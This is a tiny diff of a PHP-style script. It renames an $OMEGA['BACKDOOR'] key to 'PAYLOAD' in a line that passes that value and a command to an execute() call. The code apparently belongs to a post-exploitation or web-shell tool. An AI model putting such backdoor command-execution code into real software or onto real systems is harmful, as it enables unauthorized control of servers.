@@ -20,7 +20,7 @@
 
 !import(execute)
 
-$result = execute($OMEGA['BACKDOOR'] . " " . $OMEGA["COMMAND"]);
+$result = execute($OMEGA['PAYLOAD'] . " " . $OMEGA["COMMAND"]);
 return $result;
 
 ?>
